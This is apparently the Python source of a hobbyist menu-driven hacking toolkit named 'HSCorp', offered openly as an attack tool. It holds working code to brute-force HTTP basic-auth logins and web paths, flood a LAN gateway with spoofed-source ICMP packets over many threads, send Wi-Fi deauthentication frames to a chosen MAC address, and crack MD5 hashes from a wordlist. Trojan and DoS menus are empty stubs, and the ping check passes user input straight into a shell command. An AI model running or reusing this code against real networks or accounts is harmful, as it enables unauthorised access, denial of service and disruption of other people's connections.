import re
import requests
from os import system
from Core import *
from scapy.layers.l2 import Ether, ARP, srp
from scapy.all import send, sendp, RandMAC
from scapy.layers.inet import IP, ICMP
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import threading
import os
import hashlib


def clear_and_renew():
    system('clear')

    print("""


          .-=-=-.
         /       /
        |         |
        | )     ( |
        \/ .\ /. \/
        (    ^    )
         |.     .|
         ||xxxxx||
         '-._._.-' 

           __  _______ ______               
           / / / / ___// ____/___  _________ 
          / /_/ /\__ \/ /   / __ \/ ___/ __ /
         / __  /___/ / /___/ /_/ / /  / /_/ /
        /_/ /_//____/\____/\____/_/  / .___/ 
                                    /_/      """)


class Web:
    def __init__(self, url: str):
        self.url = url

    def host_online_check(self, ping_time: int = 1) -> bool:
        ping = os.system(f'ping -w {ping_time} {self.url} >ping.cache')
        if ping != 0:
            os.system('rm ping.cache')
            return False
        else:
            os.system('rm ping.cache')
            return True

    @lightweight_generator
    def pop_up_login_brute(self, wordlist: str, known_username: str) -> str:
        if not os.path.exists(wordlist):
            raise FileNotFoundError(f"File '{wordlist}' does not exist.")

        for line in open(wordlist):
            credentials = (known_username, line.strip())
            password = line.strip()
            response = requests.get(self.url, auth=credentials)
            yield f"Trying: {password}"

            if response:
                yield f"\nPASSWORD FOUND: {password}\n"
                break

    @lightweight_generator
    def crawler(self, url_list: str, write_file: str) -> str:
        if not os.path.exists(url_list):
            raise FileNotFoundError(f"File '{url_list}' does not exist.")

        urls_found = 0

        try:
            for line in open(url_list):
                line = line.strip()
                response = requests.get(f'{self.url}/{line}')  # Makes request to a website https://example.org/{line}
                yield response.url  # Url check generator.

                if response:
                    with open(write_file, 'a') as f:
                        f.write(f'{response.url}\n')

                    yield f"\nURL FOUND: {response.url}\n"
                    urls_found += 1

                    f.close()

            system('clear')
            yield f"\nUrls Found: {urls_found}\n"  # Tells amount of urls that have been found.

        except KeyboardInterrupt:
            system('clear')

            yield f"\nUrls Found: {urls_found}\n"
            yield "\nCheck the write file for all found urls."


class LAN:
    def __init__(self, mac: str = None):
        self.gateway = ''.join([i for i in re.findall(r'(?<=via)\s\d+\.\d+\.\d+\.\d+', os.popen('ip r').read())])
        self.mac = mac

    def list_devices(self):
        target = f"{self.gateway.strip()}/24"
        arp = ARP(pdst=target)
        broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
        packet = broadcast / arp
        result = srp(packet, timeout=3, verbose=False)[0]

        devices = []

        for sent, received in result:
            devices.append({"IP": received.psrc, "MAC": received.hwsrc})

        return devices

    def lan_saturation(self, msg: str = "HSC advices you to go offline and play outside."):
        for i in range(100):
            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)
            send(IP(src='6.6.6.6', dst=self.gateway.strip()) / ICMP() / msg)

    def saturate_lan(self, thread_amount: int):
        threads = []

        for i in range(thread_amount):
            yield f"Hitting {self.gateway.strip()} on 6.6.6.6"
            thread = threading.Thread(target=self.lan_saturation)
            thread.daemon = False
            threads.append(thread)

        for i in range(thread_amount):
            threads[i].start()

        for i in range(thread_amount):
            threads[i].join()

    @out_of_order
    def de_auth(self):
        broadcast = 'ff:ff:ff:ff:ff:ff'

        pkt = RadioTap() / Dot11(addr1=broadcast, addr2=self.mac, addr3=self.mac) / Dot11Deauth()
        sendp(pkt, iface='wlo1', count=200, inter=.2)


class DoS:
    def __init__(self, target_ip: str, target_port: int, byte_size: int):
        self.target_ip = target_ip
        self.target_port = target_port
        self.full_address = (target_ip, target_port)


class HashCracker:
    def __init__(self, _hash: hash, wordlist_file_path: str):
        self.hash = _hash
        self.wordlist = wordlist_file_path

        if not os.path.exists(wordlist_file_path):
            raise FileNotFoundError(f"{wordlist_file_path} does not exist. ")

    def md5(self) -> str:
        for line in open(self.wordlist):
            line = line.strip()
            hashed_wl_value = hashlib.md5(bytes(line.encode('utf-8'))).hexdigest()

            yield f"HEX DIGEST: {hashed_wl_value}"

            if hashed_wl_value == self.hash:
                yield f"\nPlain text found!: {line}\n"
                break


if __name__ == '__main__':
    system('clear')

    print("""


      .-=-=-.
     /       /
    |         |
    | )     ( |
    \/ .\ /. \/
    (    ^    )
     |.     .|
     ||xxxxx||
     '-._._.-' 

       __  _______ ______               
       / / / / ___// ____/___  _________ 
      / /_/ /\__ \/ /   / __ \/ ___/ __ /
     / __  /___/ / /___/ /_/ / /  / /_/ /
    /_/ /_//____/\____/\____/_/  / .___/ 
                                /_/      """)

CURRENT_MODULE = None


def cat_select():  # This function is the first startup function.
    global CURRENT_MODULE

    def password_gen():
        if not os.path.exists('a.out'):
            os.system('g++ passwordGen.cpp')
            os.system('./a.out')
        else:
            os.system('./a.out')

        os.system('rm a.out')

    def brute():
        if not os.path.exists('a.out'):
            os.system('g++ brute.cpp')
            system('./a.out')
        else:
            os.system('./a.out')

        os.system('rm a.out')

    def mem_addr():
        if not os.path.exists('a.out'):
            os.system('g++ memAddr.cpp')
            os.system('./a.out')
        else:
            os.system('./a.out')
            os.system('rm a.out')

    def calculator():
        if not os.path.exists('a.out'):
            os.system('g++ calc.cpp')
            os.system('./a.out')
        else:
            os.system('./a.out')
            os.system('rm a.out')

    def eggs():
        if not os.path.exists('a.out'):
            os.system('gcc egg.c')
            os.system('./a.out')
        else:
            os.system('./a.out')
            os.system('rm a.out')

    def gateway():
        if not os.path.exists('a.out'):
            os.system('gcc iptool.c')
            os.system('./a.out')
        else:
            os.system('./a.out')
            os.system('rm a.out')

    while True:
        command = input('option> ')
        if command == 'exit':
            exit(0)
        elif command == 'clear':
            clear_and_renew()
        elif command == 'cat':
            cat = input('category-select>> ')
            if cat == 'web':
                CURRENT_MODULE = 'WEB_MODULE'
                break
            elif cat == 'network':
                CURRENT_MODULE = 'NETWORK_MODULE'
                break
            elif cat == 'iot':
                CURRENT_MODULE = 'IOT_MODULE'
                break
            elif cat == 'trojan':
                CURRENT_MODULE = 'TROJAN_MODULE'
                break
            elif cat == "windows_supported":
                CURRENT_MODULE = "WINDOWS_SUPPORT"
                break
            elif cat == "cryptography":
                CURRENT_MODULE = "CRYPTOGRAPHY"
                break
        elif command == 'get_mem_addr':  # feature is useless, for testing only.
            mem_addr()
        elif command == 'password_gen':
            password_gen()
        elif command == "password_brute_demo":
            brute()
        elif command == 'calc':
            calculator()
        elif command == "help":
            print("""
                    1. get_mem_addr
                    2. password_gen
                    3. password_brute_demo
                    4. calc
                    5. help
                    6. cat
                    
                    <---- CAT COMMANDS ---->
                    1. trojan
                    2. iot
                    3. network
                    4. web
                    5. windows_supported
                    6. cryptography
                  """)
        elif command == "chicken":
            eggs()
        elif command == "gateway_data":
            gateway()


cat_select()  # Calling the cat select function.


# Module selections


def web_module():
    url = None
    web = None

    # <---------- MAIN FUNCTIONS ---------->

    def login_brute(wordlist: str, known_uname: str):
        for password in web.pop_up_login_brute(wordlist, known_uname):
            print(password)

    def crawl(_url_list: str, file_write: str):
        for _url in web.crawler(_url_list, file_write):
            print(_url)

    def _help():
        print("""
              1.set_url (sets url).
              2. current_url (gives current url).
              3. check_host (checks a host via ping).
              4. crawl (crawls a website).
              5. login_brute (brute forces a pop up login).
              6. back (goes back to category select).
              7. dos (dos module).
              7. phishing_page (phishing).""")

    # <========== END OF MAIN FUNCTIONS ==========>

    # <---------- INPUTS ---------->

    def check_host_input():
        if url is not None and web is not None:  # Checks if url is not None so it does not break.
            time = int(input('web(ping-time)>> '))  # Ping time.
            if web.host_online_check(time):  # host_online_check method returns bool.
                print("Host online.")
            else:
                print("Host offline.")
        else:
            print("URL is not set, please set the URL.")

    def crawl_input():
        if url is not None and web is not None:
            url_list = input("web(url-list)>> ")  # Asks for url-list.
            write_file = input("web(write-file-name)>> ")  # Asks for file to write found urls.
            crawl(url_list, write_file)
        else:
            print("URL is empty, please specify URL.")

    def login_brute_input():
        if url is not None and web is not None:
            wl = input('web(wordlist-file-path)>> ')  # Wordlist file path.
            known_username = input("web(known-username)>> ")
            login_brute(wl, known_username)  # Brutes login.
        else:
            print("URL is empty, please specify URL.")

    @out_of_order
    def dos_input():
        if os.getuid() == 0:
            ip = input("web(ip)>> ")
            port = int(input("web(port)>> "))
            byte_size = int(input("web(byte_size)>> "))

            dos = DoS(
                target_ip=ip,
                target_port=port,
                byte_size=byte_size
            )

            confirmation = input("Are you sure? (y/n)")
            if confirmation != 'y':
                web_module()
            else:
                pass  # flooding goes here.
        else:
            print("Please run this as root.")

        # <========== END OF INPUTS ==========>

    while True:
        cmd = input('web> ')
        if cmd == 'set_url':
            url = input('web(url)>> ')  # Allows you to set the url.
            web = Web(url)
        elif cmd == 'current_url':
            print(url)
        elif cmd == "check_host":
            check_host_input()
        elif cmd == "login_brute":
            login_brute_input()
        elif cmd == 'clear':
            clear_and_renew()  # Clears screen.
        elif cmd == 'crawl':
            crawl_input()
        elif cmd == 'exit':  # Allows you to exit.
            exit(0)
        elif cmd == 'back':
            cat_select()
        elif cmd == 'help':
            _help()
        elif cmd == 'dos':
            dos_input()
        else:
            print("Invalid command.")


def network_module():
    network = None
    configured = False

    def get_gateway():
        lan = LAN()
        print(lan.gateway.strip())

    def fetch_all_devices():
        lan = LAN()

        for device in lan.list_devices():
            print('IP\t\tMAC')
            print(device['IP'], device['MAC'])

    def _help():
        print("""
            1. gateway_addr (gives gateway addr).
            2. fetch_all_devices (fetches the MAC of every device on the LAN).
            3. lan_flood (floods the lan).
            4. clear (clears screen).
            5. exit (exits program).
            6. back (goes back to category selection). 
            7. deauth (Deauths a MAC address).
            8. rand_mac (generates random mac address).""")

    def lan_flood(_msg: str, threads: int):
        lan = LAN()

        for _msg in lan.saturate_lan(10):
            print(_msg)

    def de_auth():    # Deauths user.
        mac = input("network(mac_address)>> ")
        lan = LAN(mac)
        lan.de_auth()

    while True:
        cmd = input('network> ')
        if cmd == 'gateway_addr':
            get_gateway()
        elif cmd == 'fetch_all_devices':
            if os.getuid() != 0:
                print("Please run as root to use this feature.")
                network_module()

            fetch_all_devices()
        elif cmd == 'clear':
            clear_and_renew()
        elif cmd == 'exit':
            exit(0)
        elif cmd == 'help':
            _help()
        elif cmd == 'flood_lan':
            if os.getuid() != 0:
                print("Please run as root to use this feature.")
                network_module()

            msg = input("network(flood-msg)>> ")
            thread_amount = int(input("flood(threads)>> "))
            lan_flood(msg, thread_amount)
        elif cmd == 'deauth':
            de_auth()
        elif cmd == 'back':
            cat_select()
        elif cmd == 'rand_mac':
            print(RandMAC())
        else:
            print("Invalid command.")


@out_of_order
def trojan_module():
    while True:
        pass


@out_of_order
def iot():
    while True:
        pass


def windows_supported_tools():
    print("\nWelcome to windows supported tools.\n")

    def brute():
        if not os.path.exists('a.out'):
            os.system('g++ brute.cpp')
            system('./a.out')
        else:
            os.system('./a.out')

        os.system('rm a.out')

    def crawler(url_: str, url_list_: str):
        if not os.path.exists(url_list_):
            raise FileNotFoundError(f"{url_list_} is not found.")
        elif 'https://' not in url_:
            raise HttpsNotIncludedError

        urls_found = 0

        try:
            for line in open(url_list_):
                line = line.strip()
                response = requests.get(f"{url_}/{line}")
                print(f"Trying: {response.url}")

                if response:
                    print(f"\n!!URL FOUND!!: {response.url}\n")
                    urls_found += 1
        except KeyboardInterrupt:
            print(f"\nUrls Found: {urls_found}")

    while True:
        cmd = input('wst> ')
        if cmd == "pass_brute_demo":
            brute()
        elif cmd == "crawl":
            url = input("wst(url)>> ")
            url_list = input("wst(url-list)>> ")
            crawler(url, url_list)
        elif cmd == 'exit':
            exit()
        elif cmd == 'clear':
            clear_and_renew()
        elif cmd == 'help':
            print("""
                1. crawl
                2. pass_brute_demo
                3. exit
                4. clear
                5. help
                6. back
                7. crypt_module
                """)
        elif cmd == 'back':
            cat_select()
        elif cmd == 'crypt_module':
            crypt()
        else:
            print("Invalid command.")


def crypt():
    def hash_crack():
        print("""
            Modes:
             
            1. md5
            """)

        hash_ = input('crypt(hash)>> ')
        wordlist = input('crypt(wordlist)>> ')
        _type = input('crypt(mode)>> ')
        hash_cracker = HashCracker(hash_, wordlist)

        if _type == 'md5':
            for digest in hash_cracker.md5():
                print(digest)

    while True:
        cmd = input('crypt> ')
        if cmd == 'hash_crack':
            hash_crack()
        elif cmd == 'help':
            print("""
                 1. hash_crack
                 2. help
                 3. exit
                 4. back
                 5. clear""")
        elif cmd == 'back':
            cat_select()
        elif cmd == 'exit':
            exit(0)
        elif cmd == 'clear':
            clear_and_renew()
        else:
            print("Invalid command.")


if CURRENT_MODULE == 'WEB_MODULE':
    web_module()
elif CURRENT_MODULE == 'NETWORK_MODULE':
    network_module()
elif CURRENT_MODULE == 'IOT_MODULE':
    iot()
elif CURRENT_MODULE == "TROJAN_MODULE":
    trojan_module()
elif CURRENT_MODULE == "WINDOWS_SUPPORT":
    windows_supported_tools()
elif CURRENT_MODULE == "CRYPTOGRAPHY":
    crypt()
